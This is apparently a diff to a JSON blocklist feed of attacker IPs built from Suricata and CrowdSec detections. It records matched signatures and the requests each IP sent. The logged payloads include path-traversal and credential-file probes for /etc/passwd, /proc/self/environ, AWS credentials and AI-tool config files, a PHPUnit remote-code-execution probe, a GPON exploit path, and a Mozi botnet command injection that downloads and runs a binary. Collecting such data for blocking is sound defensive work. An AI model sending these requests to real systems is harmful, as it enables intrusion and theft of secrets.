@@ -1,60 +1,13 @@
 {
-  "generated_at": "2026-08-25T13:00:00Z",
+  "generated_at": "2026-08-26T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 51,
-    "v4": 51,
+    "total": 54,
+    "v4": 54,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "185.177.72.38",
-      "family": "v4",
-      "first_seen": "2026-08-18T20:00:00Z",
-      "last_seen": "2026-08-18T20:00:00Z",
-      "scenarios": [
-        "crowdsec/CVE-2017-9841",
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing",
-        "crowdsec/http-wordpress-scan",
-        "suricata/SERVER-WEBAPP PHPUnit PHP remote code execution attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "211590",
-      "asn_name": "BUCKLOG Bucklog SARL",
-      "asn_prefix": "185.177.72.0/24",
-      "payloads": [
-        "GET /debug/default/view",
-        "GET /phpinfo.php",
-        "GET /aws.yml",
-        "GET /info.php",
-        "GET /symfony/public",
-        "GET /.envrc",
-        "GET /admin/.env",
-        "GET /administrator/.env",
-        "GET /wp-admin/.env",
-        "GET /wp-json/gravitysmtp/v1/tests/mock-data?page=gravitysmtp-settings",
-        "GET /",
-        "GET /.env",
-        "GET /.remote",
-        "GET /.local",
-        "GET /.production",
-        "GET /vendor/.env",
-        "GET /lib/.env",
-        "GET /lab/.env",
-        "GET /cronlab/.env",
-        "GET /cron/.env",
-        "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-        "POST /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php"
-      ]
-    },
     {
       "ip": "185.177.72.56",
       "family": "v4",
@@ -586,66 +539,6 @@
       "asn_prefix": "206.189.176.0/20"
     },
     {
-      "ip": "172.189.127.17",
-      "family": "v4",
-      "first_seen": "2026-08-18T23:00:00Z",
-      "last_seen": "2026-08-18T23:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.160.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /c/msdownload/update/software/defu/2026/08/am_delta_patch_1.457.227.0_3eb53ab7966bad7deafa2d80bd4184d1cc4898b0.exe?cacheHostOrigin=3.au.download.windowsupdate.com"
-      ]
-    },
-    {
-      "ip": "172.189.127.11",
-      "family": "v4",
-      "first_seen": "2026-08-18T18:00:00Z",
-      "last_seen": "2026-08-18T18:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.160.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /c/msdownload/update/software/defu/2026/08/am_delta_patch_1.457.211.0_b76022a497c0e72fb3bc61c99234f91e2ad5714f.exe?cacheHostOrigin=au.download.windowsupdate.com"
-      ]
-    },
-    {
-      "ip": "110.78.252.134",
-      "family": "v4",
-      "first_seen": "2026-08-18T17:00:00Z",
-      "last_seen": "2026-08-18T17:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "9335",
-      "asn_name": "NTPCL-AS-AP - National Telecom Public Company Limited",
-      "asn_prefix": "110.78.252.0/24",
-      "payloads": [
-        "POST /cgi-bin/ViewLog.asp"
-      ]
-    },
-    {
       "ip": "169.58.152.81",
       "family": "v4",
       "first_seen": "2026-08-22T14:00:00Z",
@@ -1050,6 +943,176 @@
       ],
       "payloads": [
         "GET /druid/index.html"
+      ]
+    },
+    {
+      "ip": "34.76.23.80",
+      "family": "v4",
+      "first_seen": "2026-08-25T17:00:00Z",
+      "last_seen": "2026-08-25T17:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing",
+        "suricata/ET WEB_SERVER /etc/passwd Detected in URI"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.76.16.0/20",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /@fs/proc/1/environ?import&raw??",
+        "GET /.cursor/mcp.json",
+        "GET /claude_desktop_config.json",
+        "GET /.gitlab-ci.yml",
+        "GET /.vite/manifest.json",
+        "GET /firebase-config.json",
+        "GET /static../.env",
+        "GET /media../.env",
+        "GET /.env.local",
+        "GET /.env",
+        "GET /aws/credentials",
+        "GET /",
+        "GET /static../etc/passwd",
+        "GET /files../etc/passwd",
+        "GET /@fs/proc/self/environ",
+        "GET /.env?raw??",
+        "GET /@fs/proc/1/environ?raw??",
+        "GET /@fs/etc/passwd?raw??",
+        "GET /etc/passwd",
+        "GET /@fs/root/.aws/credentials?raw??",
+        "GET /@fs/etc/passwd?import&raw??",
+        "GET /assets../../../etc/passwd",
+        "GET /read?url=file:///proc/self/environ",
+        "GET /@fs/proc/self/environ?raw??",
+        "GET /proc/self/environ",
+        "GET /?file=../../../../etc/passwd",
+        "GET /download?file=../../../../etc/passwd",
+        "GET /media../etc/passwd"
+      ]
+    },
+    {
+      "ip": "66.240.236.109",
+      "family": "v4",
+      "first_seen": "2026-08-25T20:00:00Z",
+      "last_seen": "2026-08-25T20:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "10439",
+      "asn_name": "CARINET - CariNet, Inc.",
+      "asn_prefix": "66.240.192.0/18",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "172.189.127.18",
+      "family": "v4",
+      "first_seen": "2026-08-25T20:00:00Z",
+      "last_seen": "2026-08-25T20:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /d/msdownload/update/software/defu/2026/08/am_delta_patch_1.457.323.0_209f19264595d990f4ce07eaf8aef66746588866.exe?cacheHostOrigin=au.download.windowsupdate.com"
+      ]
+    },
+    {
+      "ip": "27.43.206.183",
+      "family": "v4",
+      "first_seen": "2026-08-25T17:00:00Z",
+      "last_seen": "2026-08-25T17:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "17816",
+      "asn_name": "CHINA169-GZ - China Unicom IP network China169 Guangdong province",
+      "asn_prefix": "27.40.0.0/13",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+      ]
+    },
+    {
+      "ip": "64.236.137.135",
+      "family": "v4",
+      "first_seen": "2026-08-25T14:00:00Z",
+      "last_seen": "2026-08-25T14:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WEB-PHP phpinfo access"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "64.236.0.0/16",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /phpinfo.php"
+      ]
+    },
+    {
+      "ip": "59.103.217.53",
+      "family": "v4",
+      "first_seen": "2026-08-25T14:00:00Z",
+      "last_seen": "2026-08-25T14:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT HackingTrio UA (Hello, World)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "141031",
+      "asn_name": "CONNECT-AS-AP - Connect Communication",
+      "asn_prefix": "59.103.217.0/24",
+      "payloads": [
+        "POST /GponForm/diag_Form?images/"
+      ]
+    },
+    {
+      "ip": "178.128.84.112",
+      "family": "v4",
+      "first_seen": "2026-08-26T00:00:00Z",
+      "last_seen": "2026-08-26T00:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "178.128.80.0/20",
+      "payloads": [
+        "GET /"
       ]
     }
   ]
